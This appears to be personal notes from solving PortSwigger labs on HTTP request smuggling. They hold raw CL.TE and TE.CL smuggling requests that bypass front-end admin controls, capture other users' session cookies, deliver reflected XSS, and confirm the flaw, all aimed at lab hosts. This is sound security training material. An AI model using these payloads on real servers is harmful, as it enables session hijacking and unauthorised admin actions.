# HTTP Request Smuggling

https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te

![](Pasted%20image%2020220801235522.png)

![](Pasted%20image%2020220801235609.png)

## HTTP Request Smuggling

Steps
1. Make sure you can smuggle things through
2. Test payloads, character at a time

https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te
![](https://i.imgur.com/PDZpK5d.png)



https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl

https://kleiton0x00.github.io/posts/Exploiting-HTTP-Request-Smuggling-(TE.CL)-XSS-to-website-takeover/

https://portswigger.net/web-security/request-smuggling/
![](https://i.imgur.com/fFhZCdn.png)

```bash=
(base) [hacker@hackerbook 01_http1_clte]$ python3
Python 3.8.5 (default, Sep  4 2020, 07:30:14) 
[GCC 7.3.0] :: Anaconda, Inc. on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> print("\r\n\r\n")



>>> 
```

```
POST / HTTP/1.1
Host: 0a57008303fc5386c05f0e2800e70018.web-security-academy.net
Content-Length: 4
Transfer-Encoding: chunked

12
GPOST / HTTP/1.1

0






```

0x12 characters because
"GPOST / HTTP/1.1" is 0x10 characters 
"\r\n" is 2 characters
Then separate chunk with another "\r\n"

![](https://i.imgur.com/m2ubw2u.png)


https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests

After tinkering around with the requests (bruteforcing length wise etc.)
![](https://i.imgur.com/aaAq08W.png)

```
POST / HTTP/1.1
Host: 0abe009604cf3ca0c04c252600620039.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 333

0

POST /post/comment HTTP/1.1
Host: 0abe009604cf3ca0c04c252600620039.web-security-academy.net
Cookie: session=VyVZBlAQabTvknzxAIPQiIq3UiCQmq7t
Content-Length: 780
Content-Type: application/x-www-form-urlencoded

csrf=KSmNOkJylzsBM91Y4x7NzA2xNqfCcw8W&postId=8&name=aaa&email=email%40email.com&website=http%3A%2F%2Fa&comment=a
```


The Content-Length of the smuggled request should be long enough to store the data but small enough to terminate after the request

```
aGET / HTTP/1.1 Host: 0abe009604cf3ca0c04c252600620039.web-security-academy.net Connection: keep-alive Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.125 Safari/537.36 Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate, br Accept-Language: en-US Cookie: victim-fingerprint=o0t8ztQa3oxtd6zDM2kjfsML8C17vXGC; secret=534LEZGPnommxTlOf5r13e95y9vzfWKU; session=2f4ozEnIVsbr1hc4fVaUi2DWZg2QCx1i
```

![](https://i.imgur.com/bE0lX6b.png)

Content Length around 750-850

Change session cookie to solve the lab

https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te
![](https://i.imgur.com/8ddC7L6.png)

```
POST / HTTP/1.1
Host: 0a850046037adeb3c0ce07d900020037.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Cookie: session=Fe59m5YqNnoa4XpBonpbOtpZ2PpZB8bT
Host: localhost
Content-Length: 182


```


```
POST / HTTP/1.1
Host: 0aef00e7038f13e0c043352b008300ec.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

88
GET /admin/delete?username=carlos HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: localhost
Content-Length: 282

x=1
0







```

https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting
![](https://i.imgur.com/KbYe8Gd.png)
![](https://i.imgur.com/U1QZ6XV.png)
```
POST / HTTP/1.1
Host: 0a28007d046483e9c0498b6600630043.web-security-academy.net
Content-Length: 75
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Host: localhost
Content-Length: 112

search=aaaaaa
```

![](https://i.imgur.com/30cf7T2.png)

```
POST / HTTP/1.1
Host: 0a28007d046483e9c0498b6600630043.web-security-academy.net
Content-Length: 99
Transfer-Encoding: chunked

0

POST /admin HTTP/1.1
Host: localhost
X-ryFdfu-Ip: 127.0.0.1
Content-Length: 112

useless=
```

https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss

![](https://i.imgur.com/OOuMvKY.png)

```
POST / HTTP/1.1
Host: 0ad1009c047e4fa7c04295cd00b70019.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 100
Transfer-encoding: chunked

0

GET /post?postId=10 HTTP/1.1
User-Agent:  "><script>alert(1);</script>
Content-Length: 10


```

## Confirming Vulnerability

https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses
```
POST / HTTP/1.1
Host: 0a4600620350a5a0c18b5b18000c00da.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```

https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses
```
POST / HTTP/1.1
Host: 0ab100390479fcb4c0e60407002a00b2.web-security-academy.net
Content-Length: 4
Transfer-Encoding: chunked

9e
GET /404 HTTP/1.1
Host: 0ab100390479fcb4c0e60407002a00b2.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

x=
0







```
